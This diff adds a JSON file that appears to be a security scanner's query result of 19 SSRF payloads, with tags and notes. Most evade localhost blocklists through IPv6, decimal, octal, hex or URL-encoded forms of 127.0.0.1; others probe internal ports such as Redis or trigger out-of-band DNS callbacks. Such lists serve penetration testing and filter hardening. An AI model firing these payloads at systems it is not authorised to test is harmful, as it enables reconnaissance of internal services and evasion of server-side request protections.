@@ -1,0 +1,333 @@
+{
+  "query": {
+    "limit": 20,
+    "max_risk": 2,
+    "vuln_type": "ssrf"
+  },
+  "count": 19,
+  "results": [
+    {
+      "id": "567b0d40dfbae7be",
+      "payload": "http://[::ffff:127.0.0.1]/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "IPv4-mapped IPv6 address for 127.0.0.1.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "ipv6",
+        "localhost",
+        "mapped"
+      ]
+    },
+    {
+      "id": "5710e501c644611e",
+      "payload": "http%3A%2F%2F127.0.0.1%2F",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "url",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "URL-encoded SSRF to localhost.",
+      "source": "ensphere",
+      "tags": [
+        "localhost",
+        "url_encoded"
+      ]
+    },
+    {
+      "id": "58fbadf62d7ad67f",
+      "payload": "http://[0:0:0:0:0:0:0:1]/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Full IPv6 loopback address.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "expanded",
+        "ipv6",
+        "localhost"
+      ]
+    },
+    {
+      "id": "5b49f0e173423a3c",
+      "payload": "http://127.0.0.1:6379/",
+      "technique": "port_scan",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Redis probe (port 6379). If accessible, response differs from closed port.",
+      "source": "ensphere",
+      "tags": [
+        "port_scan",
+        "redis"
+      ]
+    },
+    {
+      "id": "5c2010b381599a4f",
+      "payload": "http%253A%252F%252F127.0.0.1%252F",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "double_url",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Double URL-encoded SSRF. Bypasses single-decode validation.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "double_url_encoded",
+        "localhost"
+      ]
+    },
+    {
+      "id": "731778b5831bc4fe",
+      "payload": "http://localhost/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Hostname-based localhost. May bypass IP-based blocklists.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "localhost",
+        "probe"
+      ]
+    },
+    {
+      "id": "7435f41b9daca1c3",
+      "payload": "http://127.0.0.1/",
+      "technique": "internal_service",
+      "injection_surface": "header",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "SSRF via header (Referer, X-Forwarded-For, X-Original-URL).",
+      "source": "ensphere",
+      "tags": [
+        "header",
+        "localhost"
+      ]
+    },
+    {
+      "id": "783eae11c4a2d455",
+      "payload": "http://127.0.0.1:PORT/",
+      "technique": "port_scan",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "timing",
+      "risk": 2,
+      "placeholders": [
+        "PORT"
+      ],
+      "notes": "Internal port scan. Compare response timing/errors across ports (22, 3306, 5432, 6379, 8080).",
+      "source": "ensphere",
+      "tags": [
+        "port_scan",
+        "recon"
+      ]
+    },
+    {
+      "id": "7858f9ddeb6bee5a",
+      "payload": "http://2130706433/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Decimal-encoded 127.0.0.1. Bypasses regex-based IP filters.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "decimal",
+        "localhost"
+      ]
+    },
+    {
+      "id": "7f41e4b9754f1bf4",
+      "payload": "http://127.1/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Short form 127.0.0.1. Some URL parsers normalize this to localhost.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "localhost",
+        "shortform"
+      ]
+    },
+    {
+      "id": "806e9528833d220e",
+      "payload": "http://0177.0.0.1/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Octal-encoded 127.0.0.1. Some parsers interpret leading 0 as octal.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "localhost",
+        "octal"
+      ]
+    },
+    {
+      "id": "90bddba267871163",
+      "payload": "http://0x7f000001/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Hex-encoded 127.0.0.1. Bypasses string-based IP checks.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "hex",
+        "localhost"
+      ]
+    },
+    {
+      "id": "9f2f18bd9f5938c8",
+      "payload": "http://COLLAB_DOMAIN/",
+      "technique": "protocol_smuggling",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "dns_hit",
+      "risk": 2,
+      "placeholders": [
+        "COLLAB_DOMAIN"
+      ],
+      "notes": "DNS-based SSRF detection. Use Burp Collaborator or Interactsh domain.",
+      "source": "ensphere",
+      "tags": [
+        "blind",
+        "dns",
+        "oob"
+      ]
+    },
+    {
+      "id": "a4ff1e8bb9b8577a",
+      "payload": "http://[::1]/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "IPv6 loopback. Bypasses IPv4-only blocklists.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "ipv6",
+        "localhost"
+      ]
+    },
+    {
+      "id": "b2f7628541befcc5",
+      "payload": "http://0x7f.0.0.1/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Mixed hex/decimal encoding. First octet in hex.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "localhost",
+        "mixed_encoding"
+      ]
+    },
+    {
+      "id": "ba48daa35baa3c56",
+      "payload": "http://0.0.0.0/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "0.0.0.0 often resolves to localhost. Bypasses naive 127.0.0.1 blocklists.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "localhost"
+      ]
+    },
+    {
+      "id": "bb382b6387dbcf90",
+      "payload": "http://127.0.0.1/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Basic localhost probe. Compare response size/timing to external URL.",
+      "source": "ensphere",
+      "tags": [
+        "localhost",
+        "probe"
+      ]
+    },
+    {
+      "id": "bb50480878a5b63f",
+      "payload": "http://127.0.0.1/",
+      "technique": "internal_service",
+      "injection_surface": "json_body",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "SSRF via JSON body URL field (webhook_url, callback, image_url, etc.).",
+      "source": "ensphere",
+      "tags": [
+        "json",
+        "localhost"
+      ]
+    },
+    {
+      "id": "db6b10930e3ff6b6",
+      "payload": "http://[0000:0000:0000:0000:0000:0000:0000:0001]/",
+      "technique": "internal_service",
+      "injection_surface": "query",
+      "encoding": "raw",
+      "evidence_type": "content_match",
+      "risk": 2,
+      "placeholders": [],
+      "notes": "Zero-padded full IPv6 loopback.",
+      "source": "ensphere",
+      "tags": [
+        "bypass",
+        "ipv6",
+        "localhost",
+        "zero_padded"
+      ]
+    }
+  ]
+}
